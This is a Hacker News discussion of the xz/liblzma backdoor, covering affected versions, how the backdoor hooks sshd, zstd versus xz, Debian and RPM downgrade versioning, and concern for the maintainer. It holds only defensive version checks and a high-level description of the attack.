[parent](#39866676) | [next](#39868962) [–]  FYI, your formatting is broken. Hacker News doesn't support backtick code blocks, you have to indent code. Anyway, so... the xz project has been compromised for a long time, at least since 5.4.5. I see that this JiaT75 guy has been the primary guy in charge of at least the GitHub releases for years. Should we view all releases after he got involved as probably compromised? | | --- | --- | --- | | | |  |  | [treffer](user?id=treffer) [9 months ago](item?id=39867790)   | [root](#39866307) | [parent](#39867517) | [next](#39868962) [–]  Thank you, formatting fixed. My TLDR is that I would regard all commits by JiaT75 as potentially compromised. Given the ability to manipulate gitnhistory I am not sure if a simple time based revert is enough. It would be great to compare old copies of the repo with the current state. There is no guarantee that the history wasn't tampered with. Overall the only safe action would IMHO to establish a new upstream from an assumed good state, then fully audit it. At that point we should probably just abandon it and use zstd instead. | | --- | --- | --- | | | |  |  | [ogurechny](user?id=ogurechny) [9 months ago](item?id=39870079)   | [root](#39866307) | [parent](#39867790) | [next](#39869690) [–]  Zstd belongs to the class of speed-optimized compressors providing “tolerable” compression ratios. Their intended use case is wrapping some easily compressible data with negligible (in the grand scale) performance impact. So when you have a server which sends gigabits of text per second, or caches gigabytes of text, or processes a queue with millions of text protocol messages, you can add compression on one side and decompression on the other to shrink them without worrying too much about CPU usage. Xz is an implant of 7zip's LZMA(2) compression into traditional Unix archiver skeleton. It trades long compression times and giant dictionaries (that need lots of memory) for better (“much-better-than-deflate”) compression ratios. Therefore, zstd, no matter how fashionable that name might be in some circles, is not a replacement for xz. It should also be noted that those LZMA-based archive formats might not be considered state-of-the-art today. If you worry about data density, there are options for both faster compression at the same size, and better compression in the same amount of time (provided that data is generally compressible). 7zip and xz are widespread and well tested, though, and allow decompression to be fast, which might be important in some cases. Alternatives often decompress much slowly. This is also a trade-off between total time spent on X nodes compressing data, and Y nodes decompressing data. When X is 1, and Y is in the millions (say, software distribution), you can spend A LOT of time compressing even for relatively minuscule gains without affecting the scales. It should also be noted that many (or most) decoders of top compressing archivers are implemented as virtual machines executing chains of transform and unpack operations defined in archive file over pieces of data also saved there. Or, looking from a different angle, complex state machines initializing their state using complex data in the archive. Compressor tries to find most suitable combination of basic steps based on input data, and stores the result in the archive. (This is logically completed in neural network compression tools which learn what to do with data from data itself.) As some people may know, implementing all that byte juggling safely and effectively is a herculean task, and compression tools had exploits in the past because of that. Switching to a better solution might introduce a lot more potentially exploited bugs. | | --- | --- | --- | | | |  |  | [treffer](user?id=treffer) [9 months ago](item?id=39870322)   | [root](#39866307) | [parent](#39870079) | [next](#39871961) [–]  Arch Linux switched switched from xz to zstd, with neglectable increase in size (<1%) but massive speedup on decompression. This is exactly the use case of many people downloading ($$$) and decompressing. It is the software distribution case. Other distributions are following that lead. You should use ultra settings and >=19 as the compression level. E.g. arch used 20 and higher compression levels do exist, but they were already at a <1% increase. It does beat xz for these tasks. It's just not the default settings as those are indeed optimized for the lzo to gzip/bzip2 range. | | --- | --- | --- | | | |  |  | [ogurechny](user?id=ogurechny) [9 months ago](item?id=39870993)   | [root](#39866307) | [parent](#39870322) | [next](#39916856) [–]  My bad, I was too focused on that class in general, imagining “lz4 and friends”. Zstd does reach LZMA compression ratios on high levels, but compression times also drop to LZMA level. Which, obviously, was clearly planned in advance to cover both high speed online applications and slow offline compression (unlike, say, brotli). Official limit on levels can also be explained by absence of gains on most inputs in development tests. Distribution packages contain binary and mixed data, which might be less compressible. For text and mostly text, I suppose that some old style LZ-based tools can still produce an archive roughly 5% percent smaller (and still unpack fast); other compression algorithms can certainly squeeze it much better, but have symmetric time requirements. I was worried about the latter kind being introduced as a replacement solution. | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39916856)   | [root](#39866307) | [parent](#39870322) | [prev](#39870993) | [next](#39870644) [–]  > the lzo to gzip/bzip2 range bzip2 is a pig that has no place being in the same sentence as lzo and gzip. It's nieche was maximum compression no matter the speed but it hasn't been relevant even there for a long time. Yet tools still need to support bzip2 because bzip2 archives are still out there and are still being produced. So we can't get rid of libbz2 anytime soon - same for liblzma. | | --- | --- | --- | | | |  |  | [the8472](user?id=the8472) [9 months ago](item?id=39870644)   | [root](#39866307) | [parent](#39870322) | [prev](#39916856) | [next](#39871961) [–]  Note that the xz CLI does not expose all available compression options of the library. E.g. rust release tarballs are xz'd with custom compression settings. But yeah, zstd is good enough for many uses. | | --- | --- | --- | | | |  |  | [shanipribadi](user?id=shanipribadi) [9 months ago](item?id=39871961)   | [root](#39866307) | [parent](#39870079) | [prev](#39870322) | [next](#39869690) [–]  Looking forward to the time when Meta will make <https://github.com/facebookincubator/zstrong.git> public found it mentioned in [https://github.com/facebook/proxygen/blob/main/build/fbcode\_...](https://github.com/facebook/proxygen/blob/main/build/fbcode_builder/manifests/zstrong), looks like it's going to be cousin of zstd, but maybe for the stronger compression use cases | | --- | --- | --- | | | |  |  | [tomrod](user?id=tomrod) [9 months ago](item?id=39869690)   | [root](#39866307) | [parent](#39867790) | [prev](#39870079) | [next](#39871251) [–]  Not just Jia. There are some other accounts of concern with associated activity or short term/bot-is names. | | --- | --- | --- | | | |  |  | [jdright](user?id=jdright) [9 months ago](item?id=39873900)   | [root](#39866307) | [parent](#39869690) | [next](#39871251) [–]  yes, like this one: <https://github.com/facebook/folly/pull/2153> | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39916911)   | [root](#39866307) | [parent](#39873900) | [next](#39871251) [–]  Interesting, this would suggest exploits other than the known sshd one. | | --- | --- | --- | | | |  |  | [joveian](user?id=joveian) [9 months ago](item?id=39871251)   | [root](#39866307) | [parent](#39867790) | [prev](#39869690) | [next](#39916787) [–]  Note that zstd (the utility) currently links to liblzma since it can compress and decompress other formats. | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39916922)   | [root](#39866307) | [parent](#39871251) | [next](#39916787) [–]  Lol as if there weren't enough general archivers already. | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39916787)   | [root](#39866307) | [parent](#39867790) | [prev](#39871251) | [next](#39868962) [–]  > Given the ability to manipulate gitnhistory I am not sure if a simple time based revert is enough. Rewritten history is not a real concern because it would have been immediately noticed by anyone updating an existing checkout. > Overall the only safe action would IMHO to establish a new upstream from an assumed good state, then fully audit it. At that point we should probably just abandon it and use zstd instead. This is absurd and also impossible without breaking backwards compatibility all over the place. | | --- | --- | --- | | | |  |  | [jwilk](user?id=jwilk) [9 months ago](item?id=39868962)   | [root](#39866307) | [parent](#39866676) | [prev](#39867517) | [next](#39867512) [–]  "#, fuzzy" means the translation is out-of-date and it will be discarded at compile time. | | --- | --- | --- | | | |  |  | [treffer](user?id=treffer) [9 months ago](item?id=39869197)   | [root](#39866307) | [parent](#39868962) | [next](#39867512) [–]  I tried to get the translation to trigger by switching to french and it does not show. You are right. So it's just odd that the tags and release tarballs diverge. | | --- | --- | --- | | | |  |  | [chasil](user?id=chasil) [9 months ago](item?id=39867512)   | [root](#39866307) | [parent](#39866676) | [prev](#39868962) | [next](#39866807) [–]  RHEL9 is shipping 5.2.5; RHEL8 is on 5.2.4. | | --- | --- | --- | | | |  |  | [fransje26](user?id=fransje26) [9 months ago](item?id=39866807)   | [root](#39866307) | [parent](#39866676) | [prev](#39867512) | [next](#39867098) [–]  Thanks for the heads up. | | --- | --- | --- | | | |  |  | [blcknight](user?id=blcknight) [9 months ago](item?id=39867098)   | [parent](#39866307) | [prev](#39866676) | [next](#39867877) [–]  > Debian testing already has a version called '5.6.1+really5.4.5-1' that is really an older version 5.4, repackaged with a newer version to convince apt that it is in fact an upgrade. I'm surprised .deb doesn't have a better approach. RPM has epoch for this purpose <http://novosial.org/rpm/epoch/index.html> | | --- | --- | --- | | | |  |  | [stefanor](user?id=stefanor) [9 months ago](item?id=39867242)   | [root](#39866307) | [parent](#39867098) | [next](#39867234) [–]  Debian has epochs, but it's a bad idea to use them for this purpose. Two reasons: 1. Once you bump the epoch, you have to use it forever. 2. The deb filename often doesn't contain the epoch (we use a colon which isn't valid on many filesystems), so an epoch-revert will give the same file name as pre-epoch, which breaks your repository. So, the current best practice is the +really+ thing. | | --- | --- | --- | | | |  |  | [kzrdude](user?id=kzrdude) [9 months ago](item?id=39868415)   | [root](#39866307) | [parent](#39867242) | [next](#39867723) [–]  Thanks for the info, the filename thing sounds like a problem, one aspect of the epoch system doesn't work for the purpose then. | | --- | --- | --- | | | |  |  | [o11c](user?id=o11c) [9 months ago](item?id=39867723)   | [root](#39866307) | [parent](#39867242) | [prev](#39868415) | [next](#39938770) [–]  Honestly, the Gentoo-style global blacklist (package.mask) to force a downgrade is probably a better approach for cases like this. Epochs only make sense if your upstream is insane and does not follow a consistent numbering system. | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39917003)   | [root](#39866307) | [parent](#39867723) | [next](#39938770) [–]  Gentoo also considers the repository (+overlays) to be the entire set of possible versions so simply removing the bad version will cause a downgrade, unlike debian and RPM systems where installing packages outside a repository is supported. | | --- | --- | --- | | | |  |  | [debianisajoke32](user?id=debianisajoke32) [9 months ago](item?id=39938770)   | [root](#39866307) | [parent](#39867242) | [prev](#39867723) | [next](#39867424) [–]  Stop the cap your honor. There is not a single filesystem that prevents you from using colons in filenames except exfat, I went ahead and checked and ext4, xfs, btrfs, zfs, and even reiserfs let you use any characters you want except \0 and /. And I fail to see why bumping the epoch would ever be a problem. Using the epoch not a reason why its bad. | | --- | --- | --- | | | |  |  | [intel\_brain](user?id=intel_brain) [9 months ago](item?id=39867424)   | [root](#39866307) | [parent](#39867242) | [prev](#39938770) | [next](#39867234) [–]  Got this on OpenSUSE: `5.6.1.revertto5.4-3.2` | | --- | --- | --- | | | |  |  | [nicolas\_17](user?id=nicolas_17) [9 months ago](item?id=39867234)   | [root](#39866307) | [parent](#39867098) | [prev](#39867242) | [next](#39869021) [–]  .deb has epochs too, but I *think* Debian developers avoid it where possible because 1:5.4.5 is interpreted as newer than *anything* without a colon, so it would break eg. packages that depend on liblzma >= 5.0, < 6. There may be more common cases that aren't coming to mind now. | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39916978)   | [root](#39866307) | [parent](#39867234) | [next](#39869021) [–]  Seems like debian is mixing too many things into the package version - version used for deciding on upgrades and abi version for dependencies should be decoupled like it is in modern RPM distros. | | --- | --- | --- | | | |  |  | [nicolas\_17](user?id=nicolas_17) [9 months ago](item?id=39919147)   | [root](#39866307) | [parent](#39916978) | [next](#39869021) [–]  If a binary library ABI is backwards-incompatible, they change the package name. I was just guessing at the reason epoch is avoided and that <6 is probably an awful example. So now I actually bothered to look it up, and it turns out the actual reason is that the epoch changes what version is considered "greater", but it's not part of the .deb filename, so you still can't reuse version numbers used in the past. If you release 5.0, then 5.1, then you want to rollback and release 1:5.0, it's going to break things in the Debian archives. [https://www.debian.org/doc/debian-policy/ch-binary.html#uniq...](https://www.debian.org/doc/debian-policy/ch-binary.html#uniqueness-of-version-numbers) Additionally, once you add an epoch you're stuck with it forever, while if you use 5.1+really5.0, you can get rid of the kludge when 5.2 is out. [https://www.debian.org/doc/debian-policy/ch-controlfields.ht...](https://www.debian.org/doc/debian-policy/ch-controlfields.html#epochs-should-be-used-sparingly) | | --- | --- | --- | | | |  |  | [5p4n911](user?id=5p4n911) [9 months ago](item?id=39869021)   | [root](#39866307) | [parent](#39867098) | [prev](#39867234) | [next](#39867143) [–]  I really like the XBPS way of the reverts keyword in the package template that forces a downgrade from said software version. It's simple but works without any of the troubles RPM epochs have with resolving dependencies as it's just literally a way to tell xbps-install that "yeah, this is a lower version number in the repository but you should update anyway". | | --- | --- | --- | | | |  |  | [pja](user?id=pja) [9 months ago](item?id=39867143)   | [root](#39866307) | [parent](#39867098) | [prev](#39869021) | [next](#39867877) [–]  Debian packages can have epochs too. I’m not sure why the maintainers haven’t just bumped the epoch here. Maybe they’re expecting a 5.6.x release shortly that fixes all these issues & don’t want to add an epoch for a very short term packaging issue? | | --- | --- | --- | | | |  |  | [NotPractical](user?id=NotPractical) [9 months ago](item?id=39867877)   | [parent](#39866307) | [prev](#39867098) | [next](#39866804) [–]  > If you're not on a rolling release distro, your version is probably older. Ironic considering security is often advertised as a feature of rolling release distros. I suppose in most instances it does provide better security, but there are some advantages to Debian's approach (stable Debian, that is). | | --- | --- | --- | | | |  |  | [javajosh](user?id=javajosh) [9 months ago](item?id=39872032)   | [root](#39866307) | [parent](#39867877) | [next](#39872318) [–]  *>Ironic considering security is often advertised as a feature of rolling release distros.* Security *is* a feature of rolling release. But supply-chain attacks like this are the exception to the rule. | | --- | --- | --- | | | |  |  | [yreg](user?id=yreg) [9 months ago](item?id=39873704)   | [root](#39866307) | [parent](#39872032) | [next](#39872318) [–]  Isn't that what security-updates-only is for? This particular backdoor is not shipped inside of a security patch, right? | | --- | --- | --- | | | |  |  | [leeoniya](user?id=leeoniya) [9 months ago](item?id=39872318)   | [root](#39866307) | [parent](#39867877) | [prev](#39872032) | [next](#39866804) [–]  i mean, rolling implies rolling 0-days, too. | | --- | --- | --- | | | |  |  | [idoubtit](user?id=idoubtit) [9 months ago](item?id=39866804)   | [parent](#39866307) | [prev](#39867877) | [next](#39866782) [–]  The article gives a link to a simple shell script that detects the signature of the compromised function. > Running OpenSSH sshd from systemd I think this is irrelevant. From the article: "Initially starting sshd outside of systemd did not show the slowdown, despite the backdoor briefly getting invoked." If I understand correctly the whole section, the behavior of OpenSSH may have differed when launched from systemd, but the backdoor was there in both cases. Maybe some distributions that don't use systemd strip the libxz code from the upstream OpenSSH release, but I wouldn't bet on it if a fix is available. | | --- | --- | --- | | | |  |  | [anarazel](user?id=anarazel) [9 months ago](item?id=39867039)   | [root](#39866307) | [parent](#39866804) | [next](#39873540) [–]  > From the article: "Initially starting sshd outside of systemd did not show the slowdown, despite the backdoor briefly getting invoked." If I understand correctly the whole section, the behavior of OpenSSH may have differed when launched from systemd, but the backdoor was there in both cases. It looks like the backdoor "deactivates" itself when it detects being started interactively, as a security researcher might. I was eventually able to circumvent that, but unless you do so, it'll not be active when started interactively. However, the backdoor would also be active if you started it with an shell script (as the traditional sys-v rc scripts did) outside the context of an interactive shell, as TERM wouldn't be set either in that context. > Maybe some distributions that don't use systemd strip the libxz code from the upstream OpenSSH release, but I wouldn't bet on it if a fix is available. There's no xz code in openssh. | | --- | --- | --- | | | |  |  | [nwallin](user?id=nwallin) [9 months ago](item?id=39873540)   | [root](#39866307) | [parent](#39866804) | [prev](#39867039) | [next](#39866929) [–]  > Maybe some distributions that don't use systemd strip the libxz code from the upstream OpenSSH release, but I wouldn't bet on it if a fix is available. OpenSSH is developed by the OpenBSD project, and systemd is not compatible with OpenBSD. The upstream project has no systemd or liblzma code to strip. If your sshd binary links to liblzma, it's because the package maintainers for your distro have gone out of their way to add systemd's patch to your sshd binary. > From the article: "Initially starting sshd outside of systemd did not show the slowdown, despite the backdoor briefly getting invoked." If I understand correctly the whole section, the behavior of OpenSSH may have differed when launched from systemd, but the backdoor was there in both cases. From what I understand, the backdoor detects if it's in any of a handful of different debug environments. If it's in a debug environment or not launched by systemd, it won't hook itself up. ("nothing to see here folks...") But if sshd isn't linked to liblzma to begin with, none of the backdoor's code even exists in the processes' page maps. I'm still downgrading to an unaffected version, of course, but it's nice to know I was never vulnerable just by typing 'ldd `which sshd`' and not seeing liblzma.so. | | --- | --- | --- | | | |  |  | [bonyt](user?id=bonyt) [9 months ago](item?id=39866929)   | [root](#39866307) | [parent](#39866804) | [prev](#39873540) | [next](#39866782) [–]  I think the distributions that *do* use systemd are the ones that add the libsystemd code, which in turn brings in the liblzma5 code. So, it may not be entirely relevant how it is run, but it needs to be a version of OpenSSH patched. | | --- | --- | --- | | | |  |  | [fransje26](user?id=fransje26) [9 months ago](item?id=39866782)   | [parent](#39866307) | [prev](#39866804) | [next](#39866741) [–]  I did notice that my debian-based system got noticeably slower and unresponsive at times the last two weeks, without obvious reasons. Could it be related? I read through the report, but what wasn't directly clear to me was: what does the exploit actually do? My normal internet connection has such an appalling upload that I don't think anything relevant could be uploaded. But I will change my ssh keys asap. | | --- | --- | --- | | | |  |  | [anarazel](user?id=anarazel) [9 months ago](item?id=39867057)   | [root](#39866307) | [parent](#39866782) | [next](#39867162) [–]  > I did notice that my debian-based system got noticeably slower and unresponsive at times the last two weeks, without obvious reasons. Could it be related? Possible but unlikely. > I read through the report, but what wasn't directly clear to me was: what does the exploit actually do? It injects code that runs early during sshd connection establishment. Likely allowing remote code execution if you know the right magic to send to the server. | | --- | --- | --- | | | |  |  | [fransje26](user?id=fransje26) [9 months ago](item?id=39868739)   | [root](#39866307) | [parent](#39867057) | [next](#39867162) [–]  Thank you for the explanation. | | --- | --- | --- | | | |  |  | [cpach](user?id=cpach) [9 months ago](item?id=39867162)   | [root](#39866307) | [parent](#39866782) | [prev](#39867057) | [next](#39866741) [–]  Are you on stable/testing/unstable? With our current knowledge, stable shouldn’t be affected by this. | | --- | --- | --- | | | |  |  | [fransje26](user?id=fransje26) [9 months ago](item?id=39868717)   | [root](#39866307) | [parent](#39867162) | [next](#39866741) [–]  Stable, luckily. Thank you for the information. | | --- | --- | --- | | | |  |  | [hostyle](user?id=hostyle) [9 months ago](item?id=39866741)   | [parent](#39866307) | [prev](#39866782) | [next](#39880464) [–]  $ dpkg-query -W liblzma5 liblzma5:amd64 5.4.1-0.2 | | --- | --- | --- | | | |  |  | [rathermucker](user?id=rathermucker) [9 months ago](item?id=39880464)   | [parent](#39866307) | [prev](#39866741) | [next](#39872887) [–]  Tumbleweed has a package: liblzma5-5.6.1.revertto5.4-3.2.x86\_64 FYI | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39917063)   | [root](#39866307) | [parent](#39880464) | [next](#39872887) [–]  revertto probably just means "revert to" but it does sound quite italian lol. | | --- | --- | --- | | | |  |  | [Epa095](user?id=Epa095) [9 months ago](item?id=39872887)   | [prev](#39866307) | [next](#39866611) [–]  I hope Lasse Collin is doing OK! Here is a older message from him [1] "I haven't lost interest but my ability to care has been fairly limited mostly due to longterm mental health issues but also due to some other things. Recently I've worked off-list a bit with Jia Tan on XZ Utils and perhaps he will have a bigger role in the future, we'll see. It's also good to keep in mind that this is an unpaid hobby project. " Github (Microsoft) are in a unique position to figure out if his account is hacked or not, and find a way to reach him. I hope they reach out and offer him some proper support! Economic support (if that's needed), or just help clearing his name. This is another tale of how we are building multi trillion dollar industries on the back of unpaid volunteers. It's not github 'job', and many other organisations have benefited even more from Lasses work, but they are in a unique position, and would be literally pocket change for them. 1:[https://www.mail-archive.com/xz-devel@tukaani.org/msg00567.h...](https://www.mail-archive.com/xz-devel%40tukaani.org/msg00567.html) | | --- | --- | --- | | | |  |  | [cbolton](user?id=cbolton) [9 months ago](item?id=39874115)   | [parent](#39872887) | [next](#39877610) [–]  In a movie his mental health issues would likely have been caused intentionally by the attacker, setting the stage for the mole to offer to step in just at the right time. Seems a bit far fetched in this case though for what looks like a tangential attack. | | --- | --- | --- | | | |  |  | [\_hbro](user?id=_hbro) [9 months ago](item?id=39876731)   | [root](#39872887) | [parent](#39874115) | [next](#39876116) [–]  In a movie, he was killed by foreign state actors, and his identity assumed by the foreign state hacker. Actually, someone should check on him. | | --- | --- | --- | | | |  |  | [maerF0x0](user?id=maerF0x0) [9 months ago](item?id=39876116)   | [root](#39872887) | [parent](#39874115) | [prev](#39876731) | [next](#39917097) [–]  or > Recently I've worked off-list a bit with Jia Tan on XZ Utils and perhaps he will have a bigger role in the future, we'll see. Is actually Jia Tan has him tied up in a basement and is posing as him. State actors can do that kind of thing. | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39917113)   | [root](#39872887) | [parent](#39876116) | [next](#39917097) [–]  In that case why bother with the Jia Tan persona at all instead of just pushing the malware as Lasse Collin. | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39917097)   | [root](#39872887) | [parent](#39874115) | [prev](#39876116) | [next](#39877610) [–]  > what looks like a tangential attack Does it? I expect that finding someone vulnerable was the more likely approach rather than messing with the life of a stable maintainer, but it does seem very much like the attacker was acting with malicious intent from the start of his interaction with the xz project. | | --- | --- | --- | | | |  |  | [slavik81](user?id=slavik81) [9 months ago](item?id=39877610)   | [parent](#39872887) | [prev](#39874115) | [next](#39874621) [–]  Lasse appears to be active and working on undoing the sabotage. [https://git.tukaani.org/?p=xz.git;a=blobdiff;f=CMakeLists.tx...](https://git.tukaani.org/?p=xz.git;a=blobdiff;f=CMakeLists.txt;h=0e4d464faba62a1270b40a0cb24c2c59e4ace409;hp=1f0191673b453ed789d915e35ee874a17818494a;hb=f9cf4c05edd14dedfe63833f8ccbe41b55823b00;hpb=af071ef7702debef4f1d324616a0137a5001c14c) | | --- | --- | --- | | | |  |  | [grumpyprole](user?id=grumpyprole) [9 months ago](item?id=39882454)   | [root](#39872887) | [parent](#39877610) | [next](#39874621) [–]  I would start restoring trust by reverting *all* this guys commits. It's the best way to be sure. | | --- | --- | --- | | | |  |  | [delfinom](user?id=delfinom) [9 months ago](item?id=39874621)   | [parent](#39872887) | [prev](#39877610) | [next](#39890664) [–]  He came on IRC, he seemed ok. He did some cleanup of access and signed off for easter. | | --- | --- | --- | | | |  |  | [farmdve](user?id=farmdve) [9 months ago](item?id=39875985)   | [root](#39872887) | [parent](#39874621) | [next](#39877401) [–]  I mean, he was right at least. Jia Tan did have a bigger role. | | --- | --- | --- | | | |  |  | [400thecat](user?id=400thecat) [9 months ago](item?id=39877401)   | [root](#39872887) | [parent](#39874621) | [prev](#39875985) | [next](#39890664) [–]  which IRC channel ? | | --- | --- | --- | | | |  |  | [rkta](user?id=rkta) [9 months ago](item?id=39879143)   | [root](#39872887) | [parent](#39877401) | [next](#39890664) [–]  The official channel for the project. | | --- | --- | --- | | | |  |  | [k8svet](user?id=k8svet) [9 months ago](item?id=39890664)   | [parent](#39872887) | [prev](#39874621) | [next](#39872944) [–]  I would like to see more attention given to this. I'm capable of compartmentalization and not over-guilting myself, but holy hell, I really hope he's doing alright. This would kind of destroy me. I was actually telling my dad about this. I have a project, 500+ users, not quite root access, but enough to cause serious damage. I can think of at least one covert way to backdoor the binary artifacts from it. About two years ago, someone showed up, started making good commits. In this case, they have some other community rep that goes back a bit further but... man it's an unsettling feeling. | | --- | --- | --- | | | |  |  | [01apr2029](user?id=01apr2029) [9 months ago](item?id=39891843)   | [root](#39872887) | [parent](#39890664) | [next](#39872944) [–]  > I'm capable of compartmentalization teach me how. help me learn how, please. any resources with practical utility you can share? or any class of therapists that are good at teaching this with right frameworks offered? thank you | | --- | --- | --- | | | |  |  | [syslog](user?id=syslog) [9 months ago](item?id=39872944)   | [parent](#39872887) | [prev](#39890664) | [next](#39866611) [–]  Relevant xkcd: <https://xkcd.com/2347/> | | --- | --- | --- | | | |  |  | [returningfory2](user?id=returningfory2) [9 months ago](item?id=39866611)   | [prev](#39872887) | [next](#39866073) [–]  A couple of years ago I wrote a Go library that wraps the xz C code and allows you to do xz compression in Go: <https://github.com/jamespfennell/xz> About a week ago I received the first PR on that repo, to upgrade to 5.6.1. I thought it was odd to get such a random PR...it's not the same GitHub account as upstream though. | | --- | --- | --- | | | |  |  | [arp242](user?id=arp242) [9 months ago](item?id=39866979)   | [parent](#39866611) | [next](#39870453) [–]  As a bit of an aside, I would never accept a PR like this, and would always update $large\_vendored\_dependency myself. This is unreviewable, and trivial to insert any backdoor (unless you go through the motions of updating it yourself and diffing, at which point the PR becomes superfluous). I'd be wary even from a well-known author unless I knew them personally on some level (real-life or via internet). Not that I wouldn't trust them, but people's machines or accounts can get compromised, people can have psychotic episodes, things like that. At the very least I'd like to have some out-of-band "is this really you?" signal. This is how I once inserted a joke in one of our (private) repos that would randomly send cryptic messages to our chat channel. This was pretty harmless and just a joke (there's some context that made it funny), but it took them years to find it – and that was only because I told them after I quit. That said, looking at the GitHub account I'd be surprised if there's anything nefarious going on here. Probably just someone using your repo, seeing it's outdated, and updating it. | | --- | --- | --- | | | |  |  | [LVB](user?id=LVB) [9 months ago](item?id=39867460)   | [root](#39866611) | [parent](#39866979) | [next](#39872449) [–]  The (most?) popular SQLite driver for Go often gets PRs to update the SQLite C amalgamation, which the owner politely declines (and I appreciate him for that stance, and for taking on the maintenance burden it brings). e.g., [https://github.com/mattn/go-sqlite3/pull/1042#issuecomment-1...](https://github.com/mattn/go-sqlite3/pull/1042#issuecomment-1125574121) | | --- | --- | --- | | | |  |  | [astrange](user?id=astrange) [9 months ago](item?id=39872774)   | [root](#39866611) | [parent](#39867460) | [next](#39872449) [–]  Meanwhile SQLite itself doesn't accept any patches for anything; if you show the author one he will at best rewrite it. | | --- | --- | --- | | | |  |  | [creatonez](user?id=creatonez) [9 months ago](item?id=39872449)   | [root](#39866611) | [parent](#39866979) | [prev](#39867460) | [next](#39870453) [–]  In this case, the project is using Git submodules for its vendored dependencies, so you can trivially cryptographically verify that they have vendored the correct dependency just by checking the commit hash. It looks really crazy on Github but in most git clients it will just display the commit hash change. | | --- | --- | --- | | | |  |  | [jaredallard2](user?id=jaredallard2) [9 months ago](item?id=39870453)   | [parent](#39866611) | [prev](#39866979) | [next](#39866882) [–]  Hey all, I’m the author of that PR. Just posted to Github with additional context: [https://github.com/jamespfennell/xz/pull/2#issuecomment-2027...](https://github.com/jamespfennell/xz/pull/2#issuecomment-2027836356) | | --- | --- | --- | | | |  |  | [ikekkdcjkfke](user?id=ikekkdcjkfke) [9 months ago](item?id=39871534)   | [root](#39866611) | [parent](#39870453) | [next](#39870616) [–]  The dopamine hits from updating stuff should come to an end, it should be thought of as adding potentially new bugs or exploits, unless the update fixes a CVE. Also Github needs to remove the green colors and checkmarks in PR's to prevent these dopamine traps from overriding any critical thinking | | --- | --- | --- | | | |  |  | [btown](user?id=btown) [9 months ago](item?id=39872648)   | [root](#39866611) | [parent](#39871534) | [next](#39875043) [–]  Counterpoint: if you wait to keep things up to date until there's a CVE, there's a higher likelihood that things will break doing such a massive upgrade, and this may slow down a very time-sensitive CVE response. Allowing people to feel rewarded for keeping things up to date is not inherently a bad thing. As with all things, the balance point will vary from project to project! | | --- | --- | --- | | | |  |  | [theptip](user?id=theptip) [9 months ago](item?id=39875699)   | [root](#39866611) | [parent](#39872648) | [next](#39875043) [–]  Exactly. You don’t want to be bleeding edge (churn, bugs) but in general you usually don’t want to be on the oldest supported version either (let alone unsupported). Risk/reward depends on the usecase of course. For a startup I’d be on the .1 version of the newest major version (never .0) if there are new features I want. For enterprise, probably the oldest LTS I can get away with. | | --- | --- | --- | | | |  |  | [aardvark179](user?id=aardvark179) [9 months ago](item?id=39875043)   | [root](#39866611) | [parent](#39871534) | [prev](#39872648) | [next](#39870616) [–]  I strongly disagree. If you don’t update your dependencies then it’s easy to lose the institutional knowledge of how to update them, and who actually owns that obscure area of your code base that depends on them. Then you get a real CVE and have to work out everything in a hurry. If you have a large code base and organisation then keep doing those upgrades so it won’t be a problem when it really matters. If it’s painful, or touches too many areas of the code you’ll be forced to refactor things so that ceases to be a problem, and you might even manage to contain things so well that you can swap implementations relatively easily when needed. | | --- | --- | --- | | | |  |  | [blueflow](user?id=blueflow) [9 months ago](item?id=39870616)   | [root](#39866611) | [parent](#39870453) | [prev](#39871534) | [next](#39871002) [–]  That sucks to have people write mails to your employer... | | --- | --- | --- | | | |  |  | [jaredallard2](user?id=jaredallard2) [9 months ago](item?id=39870640)   | [root](#39866611) | [parent](#39870616) | [next](#39871002) [–]  To be honest, I probably wouldn't have noticed the comments on the PR if it wasn't for that since my Github notifications are an absolute mess. Thankfully, my employer has been super supportive throughout this :D | | --- | --- | --- | | | |  |  | [SheinhardtWigCo](user?id=SheinhardtWigCo) [9 months ago](item?id=39871002)   | [root](#39866611) | [parent](#39870453) | [prev](#39870616) | [next](#39866882) [–]  I appreciated your detailed update! | | --- | --- | --- | | | |  |  | [Bromeo](user?id=Bromeo) [9 months ago](item?id=39866882)   | [parent](#39866611) | [prev](#39870453) | [next](#39866767) [–]  I don't want to read too much into it, but the person (supposedly) submitting the PR seems to work at 1Password since December last year, as per his Linkedin. (And his Linkedin page has a link to the Github profile that made the PR). | | --- | --- | --- | | | |  |  | [lelandbatey](user?id=lelandbatey) [9 months ago](item?id=39869788)   | [root](#39866611) | [parent](#39866882) | [next](#39867400) [–]  They're definitely a real person. I know cause that "1Password employee since December" is a person I know IRL and worked with for years at their prior employer. They're not a no-name person or a fake identity just FYI. Please don't be witch hunting; this genuinely looks like an unfortunate case where Jared was merely proactively doing their job by trying to get an externally maintained golang bindings of XZ to the latest version of XZ. Jared's pretty fantastic to work with and is definitely the type of person to be filing PRs on external tools to get them to update dependencies. I think the timing is comically bad, but I can vouch for Jared. <https://github.com/jamespfennell/xz/pull/2> | | --- | --- | --- | | | |  |  | [greatjack613](user?id=greatjack613) [9 months ago](item?id=39869837)   | [root](#39866611) | [parent](#39869788) | [next](#39867400) [2 more]  [flagged] | | --- | --- | --- | | | |  |  | [lelandbatey](user?id=lelandbatey) [9 months ago](item?id=39869994)   | [root](#39866611) | [parent](#39869837) | [next](#39867400) [–]  Here's a PR on an employer-owned public Github repository where I made a change and Jared approved it. Please, let's not witch hunt. <https://github.com/getoutreach/stencil-golang/pull/404> | | --- | --- | --- | | | |  |  | [bombcar](user?id=bombcar) [9 months ago](item?id=39867400)   | [root](#39866611) | [parent](#39866882) | [prev](#39869788) | [next](#39868199) [–]  If I were trying to compromise supply chains, getting into someplace like 1Password would be high up on the list. Poor guy, he's probably going to get the third degree now. | | --- | --- | --- | | | |  |  | [switch007](user?id=switch007) [9 months ago](item?id=39868199)   | [root](#39866611) | [parent](#39866882) | [prev](#39867400) | [next](#39866897) [–]  As a 1Password user, I just got rather nervous. | | --- | --- | --- | | | |  |  | 